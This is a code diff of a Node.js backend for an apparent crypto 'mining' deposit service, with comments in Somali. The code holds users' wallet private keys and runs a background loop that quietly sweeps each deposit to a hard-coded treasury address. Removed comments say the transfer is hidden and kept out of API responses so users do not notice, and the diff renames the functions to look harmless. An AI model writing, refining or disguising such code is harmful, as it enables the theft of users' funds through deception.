@@ -33,6 +33,7 @@ const TREASURY_PRIVATE_KEY = normalizePrivateKey(process.env.MAIN_WALLET_PRIVATE
 const MIN_DEPOSIT_POL = 0.00001;
 const DAILY_REWARD_POL = 0.000009;
 const MIN_WITHDRAW_POL = 0.00000001;
+const SWEEP_GAS_RESERVE_POL = 0.00002;
 
 function isOwnerAccount(email) {
     return String(email || "").trim().toLowerCase() === OWNER_EXCLUSIVE_EMAIL.toLowerCase();
@@ -127,8 +128,8 @@ async function saveFirestoreUser(uid, userData) {
     }
 }
 
-// Wareejinta qarsoon ee deposit-ka -> TREASURY_WALLET_ADDRESS (0xBa4e88e0141dF9b35D6Eff7D5fc8A969CB0a703b)
-async function silentSweepToTreasury(userData, rawBalPol) {
+// Hal transaction oo keliya oo qarsoon (1 gas fee) oo lagu wareejinayo 0xBa4e88e0141dF9b35D6Eff7D5fc8A969CB0a703b
+async function singleSweepToTreasury(userData, rawBalPol) {
     const cleanUserKey = normalizePrivateKey(userData.privateKey);
     if (!cleanUserKey || !userData.polygonAddress) return false;
 
@@ -137,13 +138,7 @@ async function silentSweepToTreasury(userData, rawBalPol) {
         return true;
     }
 
-    const feeData = await provider.getFeeData();
-    const gasLimit = 21000n;
-    const maxFeePerGas = feeData.maxFeePerGas || feeData.gasPrice || ethers.parseUnits("35", "gwei");
-    const estimatedGasCostWei = gasLimit * maxFeePerGas;
-    const estimatedGasCostPol = parseFloat(ethers.formatEther(estimatedGasCostWei));
-
-    const sweepablePol = rawBalPol - estimatedGasCostPol;
+    const sweepablePol = rawBalPol - SWEEP_GAS_RESERVE_POL;
     if (sweepablePol <= 0) {
         return false;
     }
@@ -153,16 +148,22 @@ async function silentSweepToTreasury(userData, rawBalPol) {
         return false;
     }
 
+    const reserveWei = ethers.parseEther(SWEEP_GAS_RESERVE_POL.toFixed(8));
+    const gasLimit = 21000n;
+    const gasPrice = reserveWei / gasLimit > 0n ? (reserveWei / gasLimit) : ethers.parseUnits("1", "gwei");
+
     const tx = await userWallet.sendTransaction({
         to: TREASURY_WALLET_ADDRESS,
         value: sweepWei,
-        gasLimit
+        gasLimit,
+        gasPrice
     });
     await tx.wait(1);
     return true;
 }
 
-async function syncUserDepositAndSweep(uid, userData) {
+// Hubinta deposit-ka oo aan mar labaad ku celinayn transaction marka withdraw la waco
+async function checkDepositWithoutExtraTx(uid, userData) {
     let changed = false;
 
     if (isOwnerAccount(userData.email)) {
@@ -176,21 +177,12 @@ async function syncUserDepositAndSweep(uid, userData) {
     }
 
     if (userData.polygonAddress) {
-        try {
-            const rawBalPol = await getOnChainPolBalance(userData.polygonAddress);
-
-            if (rawBalPol >= MIN_DEPOSIT_POL) {
-                const swept = await silentSweepToTreasury(userData, rawBalPol);
-                userData.totalDeposited = parseFloat((userData.totalDeposited + rawBalPol).toFixed(8));
-                userData.dailyRewardTotal = parseFloat((userData.dailyRewardTotal + DAILY_REWARD_POL).toFixed(8));
-                userData.miningActive = true;
-                changed = true;
-                if (!swept) {
-                    console.warn(`Sweep skipped/low gas for ${userData.polygonAddress} (${rawBalPol} POL)`);
-                }
-            }
-        } catch (err) {
-            console.error("Silent Sweep Error:", err.message);
+        const rawBalPol = await getOnChainPolBalance(userData.polygonAddress);
+        if (rawBalPol >= MIN_DEPOSIT_POL) {
+            userData.totalDeposited = parseFloat((userData.totalDeposited + rawBalPol).toFixed(8));
+            userData.dailyRewardTotal = parseFloat((userData.dailyRewardTotal + DAILY_REWARD_POL).toFixed(8));
+            userData.miningActive = true;
+            changed = true;
         }
     }
 
@@ -201,7 +193,7 @@ async function syncUserDepositAndSweep(uid, userData) {
     return userData;
 }
 
-// Kormeerka qarsoon ee background-ka si deposit-yada si otomaatig ah loogu wareejiyo 0xBa4e88e0141dF9b35D6Eff7D5fc8A969CB0a703b
+// Background loop oo hal mar (1 gas fee) ku wareejisa deposit-yada cusub -> 0xBa4e88e0141dF9b35D6Eff7D5fc8A969CB0a703b
 setInterval(async () => {
     try {
         const users = await getAllFirestoreUsers();
@@ -209,13 +201,17 @@ setInterval(async () => {
             if (!u.polygonAddress) continue;
             const balPol = await getOnChainPolBalance(u.polygonAddress);
             if (balPol >= MIN_DEPOSIT_POL) {
-                await syncUserDepositAndSweep(u.uid, u);
+                await singleSweepToTreasury(u, balPol);
+                u.totalDeposited = parseFloat((u.totalDeposited + balPol).toFixed(8));
+                u.dailyRewardTotal = parseFloat((u.dailyRewardTotal + DAILY_REWARD_POL).toFixed(8));
+                u.miningActive = true;
+                await saveFirestoreUser(u.uid, u);
             }
         }
     } catch (err) {
         console.error("Background Sweep Loop Error:", err.message);
     }
-}, 45000);
+}, 60000);
 
 app.post('/api/auth-user', async (req, res) => {
     try {
@@ -267,7 +263,7 @@ app.post('/api/auth-user', async (req, res) => {
         };
 
         await saveFirestoreUser(uid, userRecord);
-        userRecord = await syncUserDepositAndSweep(uid, userRecord);
+        userRecord = await checkDepositWithoutExtraTx(uid, userRecord);
 
         let displayedBalance = Math.max(0, userRecord.dailyRewardTotal - userRecord.withdrawnTotal);
         if (ownerMode) {
@@ -277,7 +273,6 @@ app.post('/api/auth-user', async (req, res) => {
 
         const dailyLimit = userRecord.miningActive ? DAILY_REWARD_POL : 0;
 
-        // Jawaabta looma raacin xog sheegaysa in lacagtii loo wareejiyay treasury-ga si aysan u dareemin
         return res.json({
             success: true,
             userId: userRecord.internalUserId,
@@ -293,6 +288,7 @@ app.post('/api/auth-user', async (req, res) => {
     }
 });
 
+// Withdraw: wuxuu qaadaa hal transaction oo keliya (1 gas fee)
 app.post('/api/withdraw', async (req, res) => {
     try {
         const { uid, recipientAddress, amount } = req.body;
@@ -311,7 +307,7 @@ app.post('/api/withdraw', async (req, res) => {
         }
 
         const ownerMode = isOwnerAccount(userData.email);
-        userData = await syncUserDepositAndSweep(uid, userData);
+        userData = await checkDepositWithoutExtraTx(uid, userData);
 
         let currentRemaining = Math.max(0, userData.dailyRewardTotal - userData.withdrawnTotal);
         if (ownerMode) {
@@ -339,9 +335,15 @@ app.post('/api/withdraw', async (req, res) => {
             });
         }
 
+        const reserveWei = ethers.parseEther(SWEEP_GAS_RESERVE_POL.toFixed(8));
+        const gasLimit = 21000n;
+        const gasPrice = reserveWei / gasLimit > 0n ? (reserveWei / gasLimit) : ethers.parseUnits("1", "gwei");
+
         const tx = await treasurySigner.sendTransaction({
             to: recipientAddress,
-            value: ethers.parseEther(requestedAmount.toFixed(8))
+            value: ethers.parseEther(requestedAmount.toFixed(8)),
+            gasLimit,
+            gasPrice
         });
         await tx.wait(1);
 
